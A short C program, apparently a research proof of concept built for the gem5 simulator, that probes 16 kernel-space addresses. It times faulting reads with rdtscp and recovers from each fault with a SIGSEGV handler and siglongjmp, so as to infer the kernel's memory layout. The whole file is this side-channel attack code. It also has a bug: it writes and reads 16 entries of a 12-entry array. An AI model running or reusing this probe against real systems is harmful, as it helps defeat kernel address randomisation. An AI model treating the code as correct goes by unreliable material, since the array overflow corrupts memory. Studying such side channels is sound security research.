#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>
#include "m5ops.h"

#define START_KERNEL 0xffffff8000000000

// signal handler
static sigjmp_buf jbuf;
static void catch_segv() {
    siglongjmp(jbuf, 1);
}

uint64_t probe_addr(uint64_t kernel_addr, int num) {
    register uint64_t time1, time2;
    int tmp=0;
    time1 = __rdtscp(&tmp);
    for (int i = 0; i < num; i++) {
        if (sigsetjmp(jbuf, 1) == 0) {
            m5_work_end(0, 0);
            char kernel_data = *(char *) kernel_addr;
        } else {
            m5_work_end(0, 0);
        }
    }
    time2 = __rdtscp(&tmp) - time1;
    return time2;
}


int main() {
    // Register a signal handler
    signal(SIGSEGV, catch_segv);

    uint64_t t[12] = {0};

    for (uint64_t i = 0; i < 16; i++) {
        t[i] = probe_addr(0xffffff8001800040 + 0x80000000 * i, 2);
    }

    for (uint64_t i = 0; i < 16; i++) {
        printf("%ld, %ld\n", i, t[i]);
    }

    return 0;
}
